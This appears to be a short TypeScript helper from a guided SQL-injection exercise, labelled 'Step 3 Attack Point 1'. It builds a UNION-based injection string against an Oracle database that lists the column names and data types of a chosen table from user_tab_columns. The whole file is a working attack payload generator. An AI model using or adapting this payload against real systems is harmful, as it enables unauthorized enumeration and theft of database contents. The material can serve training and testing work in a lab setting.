/** Step 3 Attack Point 1 payload — replace table name from step 2 SCHEMA row. */
export function columnPayloadForTable(tableName: string): string {
  const table = tableName.toUpperCase().replace(/'/g, "");
  return `' AND 1=0 UNION SELECT ROWNUM, column_name || ' · ' || data_type, 0, 'COLUMNS' FROM user_tab_columns WHERE table_name = '${table}' --`;
}
